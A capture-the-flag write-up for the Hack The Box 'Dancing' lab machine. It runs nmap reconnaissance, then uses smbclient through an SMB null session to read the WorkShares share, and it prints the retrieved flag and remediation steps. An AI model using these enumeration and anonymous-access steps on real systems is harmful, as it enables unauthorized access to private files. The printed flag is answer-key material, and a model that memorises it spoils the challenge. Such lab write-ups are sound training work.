# Dancing

**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Windows · **Difficulty:** Tier 0

**Summary:** SMB allowed a null session. That gave anonymous access to an internal share (`WorkShares`) and to the user files in it.

## 1. Reconnaissance

- **Command:** `nmap -sC -sV 10.129.9.24`
- **Open ports:**

| **Port** | **Service**   | **Version**                   | **State** |
| -------- | ------------- | ----------------------------- | --------- |
| 135      | msrpc         | Windows RPC                   | Open      |
| 139      | netbios-ssn   | Windows netbios-ssn           | Open      |
| 445      | microsotf-ds? | SMB                           | Open      |
| 5985     | http          | HTTPAPI httpd 2.0 (SSDP/UPnP) | Open      |

- **Services:** Microsoft Windows SMB (139, 445), WinRM/HTTPAPI 2.0 (5985), RPC (135).
- **Key findings:**
  1. Nmap's `smb2-security-mode` script shows SMB 3.1.1 with message signing enabled but not required.
  2. Listing shares with `smbclient -L` reveals a non-standard share, `WorkShares`, readable through a null session with no credentials.

## 2. Foothold

- **Vulnerability:** unauthenticated access to SMB shares (null session / guest access).
- **Reference:** MITRE ATT&CK T1021.002 (SMB/Windows Admin Shares).

Steps:
1. Connect to the share with a blank login (press Enter at the password prompt): `smbclient //10.129.9.24/WorkShares`
2. Browse the exposed user folders: `ls` -> `cd James.P`
3. Download the file: `get flag.txt`

```
    ┌──(julicc㉿diavlo)-[~]
	└─$ smbclient //10.129.9.24/WorkShares
	Password for WORKGROUP\julicc:
	Try "help" to get a list of possible commands.
	smb: \> help
	smb: \> ls James.P\
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

		5114111 blocks of size 4096. 1750444 blocks available
	smb: \> get James.P\flag.txt 
	getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
	smb: \> exit
	                                                                                          
	┌──(julicc㉿diavlo)-[~]
	└─$ cat flag.txt 
	035db21c881520061c53e0536e44f815
```

## 3. Privilege Escalation

Not applicable: the flag sits in the open share.

- 🚩 **Flag:** `035db21c881520061c53e0536e44f815`

## 4. Conclusion

**Severity:** High

**Chain:** SMB null session → readable `WorkShares` share → user data exposed.

**Remediation:**
1. **Access control:** disable null sessions and the Guest account in Windows Server local policy.
2. **Share and NTFS permissions:** grant read/write on `WorkShares` only to authorized groups (e.g. `Domain Users`) and remove `Everyone`.
